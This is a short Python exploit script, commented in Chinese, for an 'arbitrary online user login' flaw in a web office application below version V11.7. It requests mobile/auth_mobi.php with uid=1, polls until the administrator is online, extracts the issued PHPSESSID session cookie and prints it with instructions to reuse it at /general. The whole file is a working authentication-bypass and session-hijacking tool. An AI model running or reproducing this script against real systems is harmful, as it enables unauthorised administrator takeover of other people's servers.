import requests
import time
import re

def Valid_login(host): ## 有效的任意用户登录 需要管理员在线
    print('[->] 检测是否存在<V11.7任意在线用户登录漏洞')
    url = host + 'mobile/auth_mobi.php?isAvatar=1&uid=1&P_VER=0'
    try:
        response = requests.get(url=url,timeout=2)
        # print(response.text)
        if 'RELOGIN' in response.text and response.status_code == 200:
            # print('[-] 目标用户处于下线状态\n')
            Valid_startlogin(url)
        else:
            PHPSESSION = re.findall(r'PHPSESSID=(.*?);',str(response.headers))[0]
            print('[*] 目标用户处于在线状态,PHPSESSID=',PHPSESSION,sep='')
            print('请修改cookie后访问/general\n')
    except:
        pass

def Valid_startlogin(host): ## 监控uid=1登录用户
    print('[->] 1秒一次测试用户是否在线（检测三次如果需要长时间检测请修改relogin.py）')
    i = 0
    try:
        while True:
            response = requests.get(url=host,timeout=2)
            if 'RELOGIN' in response.text and response.status_code == 200:
                print(' [-] 目标用户处于下线状态\n ' + time.asctime())
                time.sleep(1)
                i += 1
                if i == 3:
                    break
            else:
                cookie_key = response.cookies.keys()[0]  ## 拼接cookie
                cookie_value = response.cookies.values()[0]
                phpsession = cookie_key + '=' + cookie_value
                print('[*] 目标用户处于在线状态,cookie如下:\n' + time.asctime())
                print(phpsession)
                break
    except:
        pass

def run(host):
    time.sleep(9)
    Valid_login(host)